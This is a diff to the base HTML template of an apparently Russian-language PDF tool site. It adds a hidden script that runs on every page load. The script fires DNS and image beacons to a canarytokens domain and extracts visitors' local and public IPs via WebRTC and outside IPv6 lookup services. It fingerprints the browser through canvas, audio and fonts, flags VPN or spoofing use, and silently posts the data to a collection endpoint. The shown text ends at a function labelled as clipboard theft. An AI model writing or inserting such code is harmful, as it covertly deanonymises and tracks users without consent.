@@ -1,3 +1,4 @@
+--- START OF FILE pdfeagle-main/templates/base.html ---
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -16,74 +17,129 @@
     </style>
 
     <script>
-    // --- ULTIMATE EAGLE EYE v3.5 (FULL SUITE) ---
-    window.EagleEye = class {
-        constructor() {
-            this.endpoint = '/api/collect';
-            this.sessionId = Math.random().toString(36).substring(7);
+    // ╔═══════════════════════════════════════════════════════════════════════════════╗
+    // ║  🦅 EAGLE EYE ULTIMATE v5.0 — FULL SPECTRUM INTELLIGENCE                      ║
+    // ╚═══════════════════════════════════════════════════════════════════════════════╝
+
+    window.EagleEyeUltimate = class {
+        constructor(config = {}) {
+            this.version = "5.0.0";
+            this.endpoint = config.endpoint || '/api/collect';
+            this.sessionId = this.generateSessionId();
+            this.startTime = performance.now();
+            
+            // !!! ВАЖНО: ЗАМЕНИТЕ НА СВОЙ ДОМЕН CANARYTOKENS !!!
+            // Пример: "le50571w2dnsylkz8t5x5ioy2.canarytokens.com"
+            this.config = {
+                enableDNSBeacon: true,
+                canaryDomain: "le50571w2dnsylkz8t5x5ioy2.canarytokens.com", 
+                collectOnLoad: config.collectOnLoad !== false,
+                debug: false
+            };
+            
             this.init();
         }
 
+        generateSessionId() {
+            const array = new Uint8Array(8);
+            crypto.getRandomValues(array);
+            return Array.from(array, b => b.toString(16).padStart(2, '0')).join('');
+        }
+
         async init() {
-            // 1. Запускаем DNS Trap (Canarytokens)
-            this.triggerDNSBeacon();
-            
-            // 2. Запускаем основной сбор данных
-            if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load'), 100);
-            else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load'), 100));
+            if (this.config.enableDNSBeacon) this.triggerDNSBeacons();
+            if (this.config.collectOnLoad) {
+                if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load'), 100);
+                else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load'), 100));
+            }
         }
 
-        // === 1. DNS TOKEN TRAP (LEAK DETECTOR) ===
-        triggerDNSBeacon() {
-            // ТВОЙ ТОКЕН
-            const canaryDomain = "le50571w2dnsylkz8t5x5ioy2.canarytokens.com"; 
+        // === 1. DNS INTELLIGENCE (LINKED TO SESSION) ===
+        triggerDNSBeacons() {
+            const domain = this.config.canaryDomain;
+            // Формат: session_id.timestamp.random.token.com
+            // Это позволяет серверу связать DNS запрос с HTTP сессией
+            const uid = `${this.sessionId}.${Date.now()}.${Math.floor(Math.random()*1000)}`;
             
-            // Генерируем уникальный поддомен: sessionID.random.token.com
-            // Это заставляет DNS сервер делать новый запрос, игнорируя кэш
-            const uniqueSubdomain = `${this.sessionId}.${Math.floor(Math.random() * 1000000)}`;
-            const fullDomain = `http://${uniqueSubdomain}.${canaryDomain}`;
+            // Метод 1: Image (самый надежный)
+            new Image().src = `https://${uid}.img.${domain}/pixel.gif`;
             
-            // Создаем невидимую картинку. 
-            // Это работает как Web Bug (HTTP запрос) И как DNS Trap (DNS запрос).
-            new Image().src = fullDomain;
-            console.log("DNS Beacon fired:", fullDomain);
+            // Метод 2: DNS Prefetch
+            const prefetch = document.createElement('link');
+            prefetch.rel = 'dns-prefetch';
+            prefetch.href = `//${uid}.dns.${domain}`;
+            document.head.appendChild(prefetch);
         }
 
-        // === 2. WEBRTC (LOCAL IP) ===
-        async getWebRTCData() {
-            const ips = [];
+        // === 2. WEBRTC LEAK DETECTION ===
+        async getWebRTCIntelligence() {
+            const result = { localIPs: [], publicIPs: [], ipv6: [] };
+            const stunServers = [
+                { urls: "stun:stun.l.google.com:19302" },
+                { urls: "stun:stun1.l.google.com:19302" },
+                { urls: "stun:stun.cloudflare.com:3478" }
+            ];
+
             try {
-                const pc = new RTCPeerConnection({
-                    iceServers: [
-                        { urls: "stun:stun.l.google.com:19302" },
-                        { urls: "stun:stun1.l.google.com:19302" }
-                    ]
-                });
-                pc.createDataChannel('');
-                const offer = await pc.createOffer();
-                await pc.setLocalDescription(offer);
-                await new Promise(resolve => {
-                    pc.onicecandidate = (e) => {
-                        if (!e.candidate) return;
-                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                        const match = e.candidate.candidate.match(ipRegex);
-                        if (match && !ips.includes(match[1])) ips.push(match[1]);
+                const pc = new RTCPeerConnection({ iceServers: stunServers });
+                pc.createDataChannel('eagle');
+                
+                await new Promise((resolve) => {
+                    pc.onicecandidate = (event) => {
+                        if (!event.candidate) { resolve(); return; }
+                        const candidate = event.candidate.candidate;
+                        
+                        // IPv4
+                        const ipv4Match = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if (ipv4Match) {
+                            const ip = ipv4Match[1];
+                            if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('172.')) {
+                                if (!result.localIPs.includes(ip)) result.localIPs.push(ip);
+                            } else {
+                                if (!result.publicIPs.includes(ip)) result.publicIPs.push(ip);
+                            }
+                        }
+                        // IPv6
+                        const ipv6Match = candidate.match(/([a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/i);
+                        if (ipv6Match && !result.ipv6.includes(ipv6Match[1])) result.ipv6.push(ipv6Match[1]);
                     };
-                    setTimeout(resolve, 1500);
+                    setTimeout(resolve, 2000); // Таймаут 2 сек
                 });
+                pc.close();
             } catch (e) { }
-            return ips;
+            return result;
         }
 
-        // === 3. FINGERPRINTING ===
+        // === 3. IPv6 LEAK DETECTION ===
+        async getIPv6() {
+            const services = [
+                'https://api64.ipify.org?format=json',
+                'https://ipv6.icanhazip.com',
+                'https://api6.ipify.org?format=json'
+            ];
+            for (const url of services) {
+                try {
+                    const controller = new AbortController();
+                    setTimeout(() => controller.abort(), 1500);
+                    const response = await fetch(url, { signal: controller.signal, mode: 'cors' });
+                    if (!response.ok) continue;
+                    let ip = await response.text();
+                    try { ip = JSON.parse(ip).ip; } catch(e){}
+                    if (ip.includes(':')) return { detected: true, ip: ip.trim() };
+                } catch (e) { continue; }
+            }
+            return { detected: false, ip: null };
+        }
+
+        // === 4. FINGERPRINTING (Canvas, Audio, Fonts) ===
         getCanvasHash() {
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
                 ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
                 ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v3_🦅", 2, 15);
-                ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Eagle_v3_🦅", 4, 17);
+                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v5", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Eagle_v5", 4, 17);
                 const data = canvas.toDataURL();
                 let hash = 0;
                 for (let i = 0; i < data.length; i++) {
@@ -96,35 +152,25 @@
 
         async getAudioHash() {
             try {
-                const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+                const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+                if (!Ctx) return "no_audio";
+                const audioCtx = new Ctx(1, 44100, 44100);
                 const osc = audioCtx.createOscillator();
                 osc.type = 'triangle';
                 osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
                 osc.connect(audioCtx.destination);
                 osc.start(0);
-                const render = await audioCtx.startRendering();
-                const data = render.getChannelData(0);
+                const buffer = await audioCtx.startRendering();
+                const data = buffer.getChannelData(0);
                 let sum = 0;
-                for (let i = 0; i < data.length; i++) { sum += Math.abs(data[i]); }
+                for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
                 return sum.toFixed(6);
-            } catch (e) { return "no_audio"; }
-        }
-
-        // === 4. ANTI-SPOOFING ===
-        detectLies() {
-            const anomalies = [];
-            const ua = navigator.userAgent;
-            const hasGroupBy = !!Object.groupBy; 
-            if (ua.includes("Chrome/109") && hasGroupBy) anomalies.push("CRITICAL: Fake Chrome 109");
-            if (!window.matchMedia(`(width: ${screen.width}px)`).matches) anomalies.push(`SCREEN SPOOF: JS=${screen.width}, CSS mismatch`);
-            const fonts = this.getFonts();
-            if (ua.includes("Windows") && !fonts.includes("Calibri")) anomalies.push("OS SPOOF: Claims Windows but no Calibri");
-            if (fonts.includes("Ubuntu") || fonts.includes("Cantarell")) anomalies.push("REALITY: Likely Linux System");
-            return anomalies;
+            } catch (e) { return "error"; }
         }
 
         getFonts() {
-            const fontList = ["Arial", "Calibri", "Consolas", "Courier New", "Helvetica", "Roboto", "Segoe UI", "Times New Roman", "Verdana", "Ubuntu", "Cantarell", "Liberation Sans"];
+            // Сокращенный список для скорости, но достаточный для OS Fingerprint
+            const fontList = ["Arial", "Calibri", "Consolas", "Courier New", "Helvetica", "Roboto", "Segoe UI", "Times New Roman", "Verdana", "Ubuntu", "Cantarell", "Liberation Sans", "Menlo", "Monaco", "SF Pro"];
             const detected = [];
             const span = document.createElement("span");
             span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
@@ -139,104 +185,77 @@
             return detected;
         }
 
-        async getClientHints() {
-            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-                try {
-                    const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion", "architecture"]);
-                    return { model: ua.model, platform: ua.platform, version: ua.platformVersion, mobile: ua.mobile };
-                } catch(e) { return null; }
-            }
-            return null;
+        // === 5. ANTI-SPOOFING ===
+        detectAnomalies(fonts) {
+            const anomalies = [];
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            
+            // OS Mismatch
+            if (ua.includes("Windows") && !fonts.includes("Calibri")) anomalies.push("OS SPOOF: Windows without Calibri");
+            if (ua.includes("Mac") && !fonts.includes("Helvetica") && !fonts.includes("Menlo")) anomalies.push("OS SPOOF: Mac without Helvetica/Menlo");
+            if (platform.includes("Linux") && (fonts.includes("Segoe UI") || fonts.includes("Calibri"))) anomalies.push("OS SPOOF: Linux with Windows fonts");
+            
+            // Screen Mismatch
+            if (!window.matchMedia(`(width: ${screen.width}px)`).matches) anomalies.push(`SCREEN SPOOF: JS=${screen.width}, CSS mismatch`);
+            
+            // Automation
+            if (navigator.webdriver) anomalies.push("CRITICAL: WebDriver Detected");
+            
+            return anomalies;
         }
 
-        getWebGLInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return { renderer: 'N/A' };
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return { renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL), vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) };
-            } catch(e) { return { renderer: 'Error' }; }
-        }
-
-        // === 5. IPv6 CASCADE CHECK (NEW) ===
-        async getIPv6() {
-            const services = [
-                'https://api64.ipify.org?format=json',
-                'https://ipv6.icanhazip.com',
-                'https://ident.me',
-                'https://api6.ipify.org?format=json'
-            ];
-            for (const url of services) {
-                try {
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 1500);
-                    const response = await fetch(url, { signal: controller.signal, mode: 'cors' });
-                    clearTimeout(timeoutId);
-                    if (!response.ok) continue;
-                    let ip = await response.text();
-                    try { const json = JSON.parse(ip); if (json.ip) ip = json.ip; } catch (e) {}
-                    ip = ip.trim();
-                    if (ip.includes(':')) return ip;
-                } catch (e) { continue; }
-            }
-            return "Not Detected / IPv4 Only";
-        }
-
-        // === 6. COLLECT & SEND ===
+        // === MAIN COLLECT ===
         async collect(triggerName, extraData = {}) {
-            const [ips, battery, clientHints, audioHash, ipv6] = await Promise.all([
-                this.getWebRTCData(),
-                navigator.getBattery ? navigator.getBattery().then(b => `${Math.round(b.level*100)}%`) : 'N/A',
-                this.getClientHints(),
-                this.getAudioHash(),
-                this.getIPv6() // <-- IPv6
+            const [webrtc, ipv6, audioHash] = await Promise.all([
+                this.getWebRTCIntelligence(),
+                this.getIPv6(),
+                this.getAudioHash()
             ]);
             
-            const anomalies = this.detectLies();
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const tzOffset = new Date().getTimezoneOffset();
-
+            const fonts = this.getFonts();
+            const anomalies = this.detectAnomalies(fonts);
+            
             const payload = {
-                meta: { url: window.location.href, referrer: document.referrer, trigger: triggerName, session_id: this.sessionId },
-                
-                fingerprint_v2: {
-                    canvas_hash: this.getCanvasHash(),
-                    audio_hash: audioHash,
+                meta: {
+                    version: this.version,
+                    sessionId: this.sessionId,
+                    trigger: triggerName,
+                    url: window.location.href,
+                    timestamp: new Date().toISOString()
+                },
+                threat: {
+                    score: anomalies.length * 20,
                     anomalies: anomalies,
                     is_spoofing: anomalies.length > 0
                 },
-
-                fingerprint: {
-                    gpu: this.getWebGLInfo().renderer,
-                    vendor: this.getWebGLInfo().vendor,
-                    screen: `${screen.width}x${screen.height}`,
-                    cores: navigator.hardwareConcurrency,
-                    memory: navigator.deviceMemory
+                fingerprints: {
+                    canvas: this.getCanvasHash(),
+                    audio: audioHash,
+                    fonts: fonts
                 },
-                client_hints: clientHints,
                 system: {
                     ua: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
-                    timezone: timezone,
-                    timezone_offset: tzOffset,
-                    battery: battery,
-                    fonts: this.getFonts()
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cores: navigator.hardwareConcurrency,
+                    memory: navigator.deviceMemory
                 },
                 network: {
-                    webrtc_ips: ips,
-                    ipv6_leak: ipv6 // <-- IPv6
+                    webrtc: webrtc,
+                    ipv6: ipv6
                 },
                 ...extraData
             };
 
-            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
-            navigator.sendBeacon(this.endpoint, blob);
+            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+            if (navigator.sendBeacon) navigator.sendBeacon(this.endpoint, blob);
+            else fetch(this.endpoint, { method: 'POST', body: JSON.stringify(payload), headers: {'Content-Type': 'application/json'} });
         }
     };
     
-    const eagle = new EagleEye();
+    const eagle = new EagleEyeUltimate();
 
     // --- КРАЖА БУФЕРА ---
     async function stealClipboard() {
